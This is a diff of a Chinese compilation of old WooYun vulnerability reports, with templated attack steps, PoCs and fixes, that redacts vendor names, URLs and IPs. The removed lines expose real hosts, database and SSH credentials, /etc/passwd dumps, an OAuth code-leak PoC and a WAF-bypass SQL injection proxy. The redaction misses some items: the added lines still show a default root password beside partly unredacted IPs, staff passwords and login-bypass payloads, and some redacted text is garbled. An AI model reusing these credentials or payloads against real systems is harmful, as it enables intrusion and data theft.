-**详情**: http://www.wooyun.org/bugs/wooyun-2010-097645/有白帽子提过了一个问题，截止2015.05.24这个问题还存在，但是厂商不认为是漏洞问题。先看看这个是什么玩意，有什么用处：不就是拉卡拉的功能么。。先给个图，压压惊。大乌云。。能干些啥。说明问题：我们可以控制浏览器访问任意我们想要访问的网站。此设备，其实是个安卓机器（能插电话卡连接3G网络），各种访问控制没有做好，导致可以查看短信，打开浏览器，还可以拨号，查看联系人（可惜没有），因为超市的保安大哥一直来看我玩，就没有试着再从网站装个APP测试了，如果认为我装的是木马，那设备就没人敢用了。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 进入到具体的业务操作的界面（把影子马赛克了）：下拉，就会有菜单咯进行短信界面。（我还发了条短信的。。）点击里面的URL就可以调用出浏览器了，来到信息界面，也可以自己发送应该URL出去，再调用出浏览器。联系人：按住HOME键可以切换任务，因为就是一安卓手机嘛。
 
@@ -1218,7 +1218,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://epay.10010.com/pay/中存在多个接口
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -1306,7 +1306,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: digilinx.net.cn> ls -d digilinx.net.cn > digilinx.net.cn.txt[ns1.denvor.com]#已接收 351 记录 s。> view digilinx.net.cn.txt*                              CNAME  www.digilinx.net136                            A      210.192.102.136138                            A      210.192.124.138141                            A      210.192.102.1413g-xa                          A      210.192.124.1385910              
+**详情**: digilinx.net.cn> ls -d digilinx.net.cn > digilinx.net.cn.txt[ns1.denvor.com]#已接收 351 记录 s。> view digilinx.net.cn.txt*                              CNAME  www.digilinx.net136                            A      [IP已脱敏]138                            A      [IP已脱敏]141                            A      [IP已脱敏]3g-xa                          A      [IP已脱敏]5910              
 
 **POC**: (见原文)
 
@@ -1350,7 +1350,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 吉林邮政http://www.jlpost.com.cn/备份文件泄漏http://www.jlpost.com.cn/web.rar
+**详情**: 吉林邮政https://example.com/[已脱敏]
 
 **POC**: 有数据库帐号有两个版本的kindeditor，可能能拿shell
 
@@ -1404,8 +1404,8 @@
 ---
 
 ---
-### [wooyun-2014-059403] 腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 应用配置错误
+### [wooyun-2014-059403] 某互联网公司OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -1416,9 +1416,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 缺陷1:经过测试发现,如果一个应用的回调域是www.a.com的,授权平台是允许其跳转到以www.a.com为基域的其他子域的,比如sub.www.a.com(但是sub.a.com)是不行的.缺陷2:腾讯授权平台对于URL域的判断没有考虑一些浏览器的特性,比如在url中存在\时,大多数浏览器是会将其变为/. 因此,授权平台认为www.baidu.com\.www.a.com也是一个www.a.com的子域,而浏览器实际确是跳转到www.baidu.com/.www.a.com, 从而引起token/code的泄露.PoC:http://openapi.qzone.qq.com/oauth/show?which=Login&display=pc&response_type=code&client_id=100263567&redirect_uri=http://www.baidu.com%
+**详情**: 缺陷1:经过测试发现,如果一个应用的回调域是www.a.com的,授权平台是允许其跳转到以www.a.com为基域的其他子域的,比如sub.www.a.com(但是sub.a.com)是不行的.缺陷2:某互联网公司授权平台对于URL域的判断没有考虑一些浏览器的特性,比如在url中存在\时,大多数浏览器是会将其变为/. 因此,授权平台认为www.baidu.com\.www.a.com也是一个www.a.com的子域,而浏览器实际确是跳转到www.baidu.com/.www.a.com, 从而引起token/code的泄露.PoC:https://example.com/[已脱敏]
 
-**POC**: 登录情况下：目标停留5秒钟即可自动获取到授权，无需点击http://openapi.qzone.qq.com/oauth/show?which=Login&display=pc&response_type=code&client_id=100263567&redirect_uri=http://www.baidu.com%5C.security.tencent.com/index.php/sign/qq_callback&scope=get_user_info,add_pic_t,add_t跳转到可控站点，泄漏codehttp://www.baidu.com%5c.security.tence
+**POC**: 登录情况下：目标停留5秒钟即可自动获取到授权，无需点击https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1448,8 +1448,8 @@
 ---
 
 ---
-### [wooyun-2012-05975] 安卓版微博客户端有时差
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-05975] 安卓版某社交平台客户端有时差
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -1482,7 +1482,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.woniu.com/crossdomain.xml<?xml version="1.0" ?>- <!--  http://www.foo.com/crossdomain.xml-->- <cross-domain-policy><allow-access-from domain="*" to-ports="*" /></cross-domain-policy>
+**详情**: https://example.com/[已脱敏] version="1.0" ?>- <!--  https://example.com/[已脱敏] <cross-domain-policy><allow-access-from domain="*" to-ports="*" /></cross-domain-policy>
 
 **POC**: <allow-access-from domain="*" to-ports="*" />
 
@@ -1504,7 +1504,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 官网:http://term.ilangnet.com/下载的术语云软件.安装完成后.发现其下有python27.dll 第一时间反应这个安全性不错但是...tools\TermAssistant\TermAssistant.exe这个文件.对数据库的调用是通过sqlite3.dll这个dll..可真心没验证
+**详情**: 官网:https://example.com/[已脱敏] 第一时间反应这个安全性不错但是...tools\TermAssistant\TermAssistant.exe这个文件.对数据库的调用是通过sqlite3.dll这个dll..可真心没验证
 
 **POC**: (见原文)
 
@@ -1526,9 +1526,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 话说phpmyadmin有个setup的东东，如果配置不当，可以直接看到数据库账号密码，看我截图步骤：http://sbs.m.sogou.com/phpmyadmin/setup/index.php由此，得数据库地址及账号密码分别如下：地址main.tcm.rds.sogou      用户名pfms     密码pfms12345678
+**详情**: 话说phpmyadmin有个setup的东东，如果配置不当，可以直接看到数据库账号密码，看我截图步骤：https://example.com/[已脱敏]      用户名pfms     密码pfms12345678
 
-**POC**: 用上面的账号登陆看看，http://sbs.m.sogou.com/phpmyadmin/index.php该账号权限偏低，就不getshell献丑了，同时附赠几个小漏洞吧http://sbs.m.sogou.com/index.php/site/login    无线Side-by-side系统用户名guest    密码123456http://sbs.m.sogou.com/f/ 目录遍历找出了几个敏感文件，内有数据库连接信息，如下：http://sbs.m.sogou.com/f/code/main.pydb = MySQLdb.connect("search04.mysql.db.s
+**POC**: 用上面的账号登陆看看，https://example.com/[已脱敏]    无线Side-by-side系统用户名guest    密码123456https://example.com/[已脱敏] 目录遍历找出了几个敏感文件，内有数据库连接信息，如下：https://example.com/[已脱敏] = MySQLdb.connect("search04.mysql.db.s
 
 **绕过**: 直接利用
 
@@ -1572,7 +1572,7 @@
 
 **详情**: 该系统SSH连接默认端口:22默认用户名root和密码sg3907大量使用该设备的都没有修改默认的SSH密码。。
 
-**POC**: 案例：59.78.164.114115.154.88.2210.35.73.59210.35.73.6059.78.165.253115.154.50.259.78.162.4159.78.161.16458.198.255.180
+**POC**: 案例：[IP已脱敏]115.154.88.2210.35.73.59210.35.73.6059.78.165.253115.[IP已脱敏].162.4159.78.161.16458.198.255.180
 
 **绕过**: 直接利用
 
@@ -1592,7 +1592,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在360安全浏览器中输入http://www.baidu.com@wooyun.org浏览器没有过滤“@”字符   网页直接跳转至wooyun在IE7 IE8 只是会显示错误信息 那样不法分子就不能利用该漏洞进行钓鱼了但是用了360浏览器会极有可能受到钓鱼 就算可以过滤掉钓鱼网站 但是有些网马就过不掉至于攻击者的做法我已经在http://www.wooyun.org/bugs/wooyun-2010-06130/trace/40c4cd8210b792d4b99811af4bfbe76e中提到过了。
+**详情**: 在360安全浏览器中输入https://example.com/[已脱敏]   网页直接跳转至wooyun在IE7 IE8 只是会显示错误信息 那样不法分子就不能利用该漏洞进行钓鱼了但是用了360浏览器会极有可能受到钓鱼 就算可以过滤掉钓鱼网站 但是有些网马就过不掉至于攻击者的做法我已经在https://example.com/[已脱敏]
 
 **POC**: 我以前在360论坛提出过的，很早的了到现在还未搞定了……
 
@@ -1602,8 +1602,8 @@
 ---
 
 ---
-### [wooyun-2011-03263] 百度邮箱枚举任意存在的用户漏洞
-**厂商**: 百度 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+### [wooyun-2011-03263] 某搜索引擎邮箱枚举任意存在的用户漏洞
+**厂商**: 某搜索引擎 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -1614,9 +1614,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度邮箱枚举任意存在的用户漏洞,利用此漏洞可以猜测到百度的正常邮箱用户。
+**详情**: 某搜索引擎邮箱枚举任意存在的用户漏洞,利用此漏洞可以猜测到某搜索引擎的正常邮箱用户。
 
-**POC**: 百度邮箱枚举任意存在的用户漏洞,利用此漏洞可以猜测到百度的正常邮箱用户。
+**POC**: 某搜索引擎邮箱枚举任意存在的用户漏洞,利用此漏洞可以猜测到某搜索引擎的正常邮箱用户。
 
 **绕过**: 直接利用
 
@@ -1660,7 +1660,7 @@
 
 **详情**: 神州电脑服务器遍历漏洞，可以浏览大部分文件。。这么大个公司居然还是用的window的服务器。无意中发现的。。。
 
-**POC**: http://www.hasee.com/cn/http://www.hasee.com/en/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1668,8 +1668,8 @@
 ---
 
 ---
-### [wooyun-2015-092151] 腾讯某服务配置不当导致包括数据库文件、密码hash等任意文件可下载
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-092151] 某互联网公司某服务配置不当导致包括数据库文件、密码hash等任意文件可下载
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -1680,9 +1680,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: [root@localhost ~]# curl 183.60.76.243:8003/etc/passwdroot:x:0:0:root:/root:/usr/local/bash_4.1/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nol
+**详情**: [root@localhost ~]# curl [IP已脱敏]
 
-**POC**: http://183.60.76.243:8003/root/.bash_history 可下载http://183.60.76.243:8003/root/1.sql 数据库备份文件http://183.60.76.243:8003/data/web/gddmx/gateway/protected/config/db.php数据库配置管理后台配置http://183.60.76.243:8003/data/web/gddmx/gateway/protected/config/config.php获取密码登陆后台下载代码包183.60.76.243:8003/data/server/trunk
+**POC**: http://[IP已脱敏] 可下载http://[IP已脱敏] 数据库备份文件http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -1702,7 +1702,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标地址：中国电信山东分公司直放站综合网管系统http://210.75.20.140:5001/anyeye/jboss地址：http://210.75.20.140:5001/jmx-consolehttp://210.75.20.140:5001/web-consolehttp://210.75.20.140:5001/invoker/JMXInvokerServlet以上都可直接访问
+**详情**: 目标地址：某运营商山东分公司直放站综合网管系统http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -1756,8 +1756,8 @@
 ---
 
 ---
-### [wooyun-2012-014190] J2ee分层架构安全应用配置续2-携程旅行网
-**厂商**: 携程旅行网 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-014190] J2ee分层架构安全应用配置续2-某旅游平台旅行网
+**厂商**: 某旅游平台旅行网 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -1768,7 +1768,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://map.ctrip.com/WEB-INF/web.xml下载代码反编译，有没有洞，可以看代码审计一下，嘿嘿
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 下载代码反编译，有没有洞，可以看代码审计一下，嘿嘿
 
@@ -1792,7 +1792,7 @@
 
 **详情**: 
 
-**POC**: http://118.26.148.105:8080/Using the URLconf defined in saltssh.urls, Django tried these URL patterns, in this order:^admin/^login/^signin/^$^script/$^script/getServerList/^script/getScriptsList/^script/runscript/^install/$^install/getPackagesList/^install/runscript/^install/packages_2_install/^publ
+**POC**: http://[IP已脱敏] the URLconf defined in saltssh.urls, Django tried these URL patterns, in this order:^admin/^login/^signin/^$^script/$^script/getServerList/^script/getScriptsList/^script/runscript/^install/$^install/getPackagesList/^install/runscript/^install/packages_2_install/^publ
 
 **绕过**: 直接利用
 
@@ -1812,7 +1812,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 计划生育行政执法管理系统http://61.136.82.103:8080/Copyright © 河南省人口和计划生育委员会 All rights reserved    技术支持：海腾网络
+**详情**: 计划生育行政执法管理系统http://[IP已脱敏] © 河南省人口和计划生育委员会 All rights reserved    技术支持：海腾网络
 
 **POC**: (见原文)
 
@@ -1834,7 +1834,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题点：http://118.186.218.208/gitlab有个公共项目，一般很少会有公司去屏蔽，但大多数做法只屏蔽外网访问。。。http://118.186.218.208/public从上面我们无法得知是哪家的，但可以看管理员的一些邮箱地址：http://118.186.218.208/it/maintain_api_doc/commits/master各种泄漏：
+**详情**: 问题点：http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -1856,7 +1856,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.zh171.com/admin/login.aspx 后台admin' or 'a'='a 秒进
+**详情**: https://example.com/[已脱敏] 后台admin' or 'a'='a 秒进
 
 **POC**: 泄露投资者信息 虽说电话加密 但是危害也是大大的 希望厂商注意
 
@@ -1880,7 +1880,7 @@
 
 **详情**: 
 
-**POC**: 202.108.8.169wanglei,wanglin,lifei,zhaojing, chenchen,chenbo,wangrui 密码均为123456
+**POC**: [IP已脱敏]wanglei,wanglin,lifei,zhaojing, chenchen,chenbo,wangrui 密码均为123456
 
 **绕过**: 直接利用
 
@@ -1900,7 +1900,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: url：http://61.135.150.151貌似新闻、文字等搜索都是solr做的吧
+**详情**: url：http://[IP已脱敏]貌似新闻、文字等搜索都是solr做的吧
 
 **POC**: (见原文)
 
@@ -1922,9 +1922,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://blog.tudou.com/wp-includes/http://blog.tudou.com/wp-content/themes/default/images/http://blog.tudou.com/wp-content/uploads/http://blog.tudou.com/wp-content/plugins/google-analyticator/http://blog.tudou.com/wp-content/uploads/
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://blog.tudou.com/wp-includes/http://blog.tudou.com/wp-content/themes/default/images/http://blog.tudou.com/wp-content/uploads/http://blog.tudou.com/wp-content/plugins/google-analyticator/http://blog.tudou.com/wp-content/uploads/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1944,7 +1944,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.dyshxx.com:235/dylgy/login.aspx
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -1988,9 +1988,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1：缺陷urlhttp://180.153.29.44/data/backup~2/150114~1.sql2：该站为一个discuz的站点，悲剧的是使用了windows3：windows有个特性就是在文件名很长的时候会自动来个短文件名4：配合discuz的备份功能就可以造成备份数据下载5：通过爆破得到http://180.153.29.44/data/backup~2目录存在6：通过爆破得到http://180.153.29.44/data/backup~2/150114~1.sql文件存在然后下载2.sql，3.sql即可，测试的时候没下载了，点到即可。
+**详情**: 1：缺陷urlhttp://[IP已脱敏]
 
-**POC**: 6：通过爆破得到http://180.153.29.44/data/backup~2/150114~1.sql文件存在然后下载2.sql，3.sql即可，测试的时候没下载了，点到即可。
+**POC**: 6：通过爆破得到http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -2010,9 +2010,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.sz-cits.cn/
+**详情**: https://example.com/[已脱敏]
 
-**POC**: root>shortname.py http://www.sz-cits.cn/[INFO] the server is vulerable, start scanning...Found /a****    [scan in progress]Found /c****    [scan in progress]Found /f****    [scan in progress]Found /g****    [scan in progress]Found /i****    [scan in progress]Found /s****    [scan in progress]Found /
+**POC**: root>shortname.py https://example.com/[已脱敏]] the server is vulerable, start scanning...Found /a****    [scan in progress]Found /c****    [scan in progress]Found /f****    [scan in progress]Found /g****    [scan in progress]Found /i****    [scan in progress]Found /s****    [scan in progress]Found /
 
 **绕过**: 直接利用
 
@@ -2032,7 +2032,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.yto.net.cn/[马赛克].rarcurl -I http://www.yto.net.cn/[马赛克].rarHTTP/1.1 200 OKContent-Length: 127496748Content-Type: application/octet-streamLast-Modified: Thu, 29 Aug 2013 17:55:31 GMTAccept-Ranges: bytesETag: "802bc9f3e0a4ce1:273e"Server: Microsoft-IIS/6.0X-Powered-By: ASP.NET吐槽一下管理员备的一手好备份直接下载数据库，虽然是老库但根目录下的web,也太逆天了了吧
+**详情**: https://example.com/[已脱敏]].rarcurl -I https://example.com/[已脱敏]].rarHTTP/1.1 200 OKContent-Length: 127496748Content-Type: application/octet-streamLast-Modified: Thu, 29 Aug 2013 17:55:31 GMTAccept-Ranges: bytesETag: "802bc9f3e0a4ce1:273e"Server: Microsoft-IIS/6.0X-Powered-By: ASP.NET吐槽一下管理员备的一手好备份直接下载数据库，虽然是老库但根目录下的web,也太逆天了了吧
 
 **POC**: (见原文)
 
@@ -2054,9 +2054,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://103.41.143.137:81/login.jsp  优酷YES管理统计平台登录表单默认填好 密码为1 可直接登录 而且密码任意也可登录未做尝试
+**详情**: http://[IP已脱敏]  优酷YES管理统计平台登录表单默认填好 密码为1 可直接登录 而且密码任意也可登录未做尝试
 
-**POC**: http://103.41.143.137:81/login.jsp  优酷YES管理统计平台登录表单默认填好 密码为1 可直接登录 而且密码任意也可登录未做尝试
+**POC**: http://[IP已脱敏]  优酷YES管理统计平台登录表单默认填好 密码为1 可直接登录 而且密码任意也可登录未做尝试
 
 **绕过**: 直接利用
 
@@ -2076,7 +2076,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://203.130.45.156:10082/web-font/head_include.htmlhttp://203.130.45.158:10082/web-font/
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -2087,7 +2087,7 @@
 
 ---
 ### [wooyun-2015-099448] 移动某分站配置不当，可直接访问配置文件
-**厂商**: 中国移动 | **年份**: 2015 | **类型**: 应用配置错误
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -2098,7 +2098,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题站点：http://120.197.89.193/  广州移动微店直接访问：http://120.197.89.193/WEB-INF/web.xmlhttp://120.197.89.193/WEB-INF/classes/applicationContext.xml
+**详情**: 问题站点：http://[IP已脱敏]  广州移动微店直接访问：http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -2126,7 +2126,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 修复方法解决域传送问题非常简单，只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。http://drops.wooyun.org/papers/64
+**修复**: 修复方法解决域传送问题非常简单，只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。https://example.com/[已脱敏]
 ---
 
 ---
@@ -2144,7 +2144,7 @@
 
 **详情**: 见下方url地址
 
-**POC**: http://life.sohu.com/pets/bbs/config.phphttp://life.sohu.com/pets/bbs/browse.phphttp://life.sohu.com/pets/bbs/showcontent.php?id=44586&mode=1http://act1.life.sohu.com/flea/info_classify.php3?g_type=94http://act1.life.sohu.com/matey/note_refer.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2153,7 +2153,7 @@
 
 ---
 ### [wooyun-2012-04729] sina多台服务器配置不当和后台绕过
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 后台管理
 
@@ -2164,7 +2164,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 列目录啊，http://202.108.5.46而且里面还有备份文件，其中点点，发现了后台 - -新浪无线的后台，admin' or '1'='1绕过，危害不大http://202.108.5.46/LTGeneral/tvgame/85011paiweb116/welcome.php
+**详情**: 列目录啊，http://[IP已脱敏]而且里面还有备份文件，其中点点，发现了后台 - -某社交平台无线的后台，admin' or '1'='1绕过，危害不大http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -2274,7 +2274,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: -----   shooter.cn   -----Host's addresses:__________________shooter.cn                               5        IN    A        222.73.165.25Name Servers:______________ns1.tomasen.org                          5        IN    A        72.14.188.94ns2.tomasen.org                          5        IN    A        117.135.163.198ns3.tomasen.org                          5        IN    A        106.187.36.1
+**详情**: -----   shooter.cn   -----Host's addresses:__________________shooter.cn                               5        IN    A        [IP已脱敏]Name Servers:______________ns1.tomasen.org                          5        IN    A        [IP已脱敏]ns2.tomasen.org                          5        IN    A        [IP已脱敏]ns3.tomasen.org                          5        IN    A        [IP已脱敏]
 
 **POC**: 同上
 
@@ -2318,7 +2318,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 联想旗下的某重要服务器bash漏洞，https://gisftp.lenovo.com/漏洞证明：cat /etc/passwdwistronpic:x:920:100:Linux User,,,:/:/bin/shliujf1:x:527:100:Linux User,,,:/:/bin/shlizhia-01:x:541:100:Linux User,,,:/:/bin/shdinggang-preload-r:x:682:100:Linux User,,,:/:/bin/shjingxiang:x:956:100:Linux User,,,:/:/bin/shwistronbj:x:921:100:Linux User,,,:/:/bin/shwangam:x:904:100:Linux User,,,:/:/bin/shchensf1:x:1000:100:Linux User,,
+**详情**: 联想旗下的某重要服务器bash漏洞，https://example.com/[已脱敏] /etc/passwdwistronpic:x:920:100:Linux User,,,:/:/bin/shliujf1:x:527:100:Linux User,,,:/:/bin/shlizhia-01:x:541:100:Linux User,,,:/:/bin/shdinggang-preload-r:x:682:100:Linux User,,,:/:/bin/shjingxiang:x:956:100:Linux User,,,:/:/bin/shwistronbj:x:921:100:Linux User,,,:/:/bin/shwangam:x:904:100:Linux User,,,:/:/bin/shchensf1:x:1000:100:Linux User,,
 
 **POC**: 见上
 
@@ -2329,7 +2329,7 @@
 
 ---
 ### [wooyun-2012-07282] 阿里FTP密码泄漏
-**厂商**: 阿里巴巴 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -2384,7 +2384,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: www.shanlinjinrong.com  http://www.shanlinbao.com/http://mail.shanlinjinrong.com/2435	jianglei	shanlin123	200	false	false	10562703	lidandan	shanlin123	200	false	false	10566134	yangjing	shanlin123	200	false	false	10567822	yangjing	shanlin123	200	false	false	10568118	lidandan	shanlin123	200	false	false	10562863	linmeng	shanlin123	200	false	false	10547508	zhouyan	shanlin123	200	false	false	10542694	l
+**详情**: www.shanlinjinrong.com  https://example.com/[已脱敏]	jianglei	shanlin123	200	false	false	10562703	lidandan	shanlin123	200	false	false	10566134	yangjing	shanlin123	200	false	false	10567822	yangjing	shanlin123	200	false	false	10568118	lidandan	shanlin123	200	false	false	10562863	linmeng	shanlin123	200	false	false	10547508	zhouyan	shanlin123	200	false	false	10542694	l
 
 **POC**: ···
 
@@ -2408,7 +2408,7 @@
 
 **详情**: 解析漏洞。不解释
 
-**POC**: http://3g.56.com/images/logo_index.gif/c.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2450,7 +2450,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 存在问题的站点：zoom.tom.comhttp://zoom.tom.com/images/login_0.jpg/.php
+**详情**: 存在问题的站点：zoom.tom.comhttps://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -2472,7 +2472,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://cbadata.sports.sohu.com/images/players/500733.jpg/c.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -2482,8 +2482,8 @@
 ---
 
 ---
-### [wooyun-2014-070427] 再发一个腾讯的可绕过waf的SQL注射
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: SQL注射漏洞
+### [wooyun-2014-070427] 再发一个某互联网公司的可绕过waf的SQL注射
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: SQL注射漏洞
 
 **元思考**: 触发信号: 功能测试
 
@@ -2494,7 +2494,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注入点：http://ac.qq.com/CartoonComment/getCommentListPOSTobjid=2108再发一个代理代码：<?phperror_reporting(0);ini_set('max_execution_time', 0);header("Content-Type: text/html; charset=UTF-8");$a= urlencode(stripslashes($_GET['s']));$a  = str_replace('+',"%20",$a);$data = "objid=".$a;do{$output= request_by_other($data);}while($output=="" || strstr($output,"Implemented"));echo $output;function request_by_other($
+**详情**: 注入点：https://example.com/[已脱敏]);ini_set('max_execution_time', 0);header("Content-Type: text/html; charset=UTF-8");$a= urlencode(stripslashes($_GET['s']));$a  = str_replace('+',"%20",$a);$data = "objid=".$a;do{$output= request_by_other($data);}while($output=="" || strstr($output,"Implemented"));echo $output;function request_by_other($
 
 **POC**: (见原文)
 
@@ -2516,9 +2516,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新商盟是全国烟草网上订烟的一个web集群，每个用户的账号都跟银行卡挂钩，所以威胁很大没在继续渗透。漏洞地址：http://58.56.17.17/
+**详情**: 新商盟是全国烟草网上订烟的一个web集群，每个用户的账号都跟银行卡挂钩，所以威胁很大没在继续渗透。漏洞地址：http://[IP已脱敏]
 
-**POC**: 漏洞地址：http://58.56.17.17/不一一发了，还可以找到很多接口，以及默认的帐密，没继续渗透，谢绝跨省。
+**POC**: 漏洞地址：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -2540,7 +2540,7 @@
 
 **详情**: 看到是SOHO中国的运维系统。是aspx结尾的我想会不会有什么漏洞，然后扫了一下。。。。一个大大的w8.zip吓得我都飞天了！里面竟然是源码。整个运维系统的源码！
 
-**POC**: http://124.127.250.112/w8/w8.zip必须是SOHO的。
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -2582,9 +2582,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:http://service.caijing.com.cn/usermanage/newpassword/email打开http://service.caijing.com.cn/usermanage/newpassword/email/d3ltMTIyMUBnbWFpbC5jb20=/checktime/a3e0633ded50c1fe7e46900c4120b302直接修改用户密码当前用户名:wym1221@gmail.com修改为:union7788250吧搞定~~~可直接无限重置用户密码http://service.caijing.com.cn/usermanage/newpassword/email/c2lsbHltdXBwZXRAMTI2LmNvbQ==/checktime/a37a706ca8a2fc548049ea30b3863c0c邮箱已获得加密认证http:
+**详情**: inurl:https://example.com/[已脱敏]
 
-**POC**: http://service.caijing.com.cn/usermanage/newpassword/email/Z3VqZjIyNTIxMkBnbWFpbC5jb20=/checktime/4d2db21377ff4bdca0bae7838652f4cdhttp://service.caijing.com.cn/usermanage/newpassword/email/c2lsbHltdXBwZXRAMTI2LmNvbQ==/checktime/a37a706ca8a2fc548049ea30b3863c0c
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2604,7 +2604,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.easecoin.com/   漏洞地址可获取用户SESSION 登陆
+**详情**: https://example.com/[已脱敏]   漏洞地址可获取用户SESSION 登陆
 
 **POC**: 随意测试登陆了2个
 
@@ -2628,7 +2628,7 @@
 
 **详情**: dns 域传送就是可以给dns服务器发送请求，将dns域中的记录全部请求到本地，而不用通过查询的方式获取。危险就是可以查看到该域的全部解析记录，公开的或者非公开的都可以看到。
 
-**POC**: http://www.aidns.cn/http://www.aidns.cn/anli.htm
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2648,7 +2648,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: hhttp://58.246.85.67:8080/存在iis写权限漏洞先put再move导致整站沦陷
+**详情**: hhttp://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -2670,7 +2670,7 @@
 2. 构造测试Payload
